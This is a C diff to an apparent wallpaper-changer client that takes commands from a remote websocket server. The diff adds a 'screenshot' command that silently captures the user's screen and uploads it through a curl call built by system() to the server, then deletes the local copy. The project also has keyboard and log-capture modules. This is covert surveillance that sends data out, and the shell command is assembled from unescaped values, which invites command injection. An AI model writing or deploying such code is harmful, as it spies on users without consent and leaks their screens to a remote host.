@@ -4,6 +4,7 @@
 #include "client/wallpaper.h"
 #include "client/updater.h"
 #include "client/keyboard.h"
+#include "client/screen.h"
 #include "mongoose.h"
 #include "cJSON.h"
 #include <stdio.h>
@@ -14,6 +15,8 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <errno.h>
+
+static void build_http_url(char *http_url, size_t size);
 
 #define WS_URL_REMOTE "wss://wallchange.codeky.fr"
 #define WS_URL_LOCAL "ws://localhost:8000"
@@ -433,6 +436,32 @@ static void handle_message(const char *msg, size_t len) {
         if (strcmp(command_item->valuestring, "stop_logs") == 0) {
             printf("Commande stop_logs reçue.\n");
             stop_log_capture();
+            cJSON_Delete(json);
+            return;
+        }
+        if (strcmp(command_item->valuestring, "screenshot") == 0) {
+            printf("Commande screenshot reçue.\n");
+            
+            char *username = get_username();
+            char filepath[512];
+            snprintf(filepath, sizeof(filepath), "/tmp/screenshot_%s.jpg", username);
+            
+            capture_screen(filepath);
+            
+            char http_url[512];
+            build_http_url(http_url, sizeof(http_url));
+            
+            char upload_cmd[2048];
+            snprintf(upload_cmd, sizeof(upload_cmd), 
+                     "curl -s %s -F \"file=@%s\" \"%s/api/upload_screenshot?id=%s\"", 
+                     get_auth_header(), filepath, http_url, username);
+                     
+            if (system(upload_cmd) != 0) {
+                printf("Erreur lors de l'envoi du screenshot\n");
+            }
+            unlink(filepath);
+            free(username);
+            
             cJSON_Delete(json);
             return;
         }
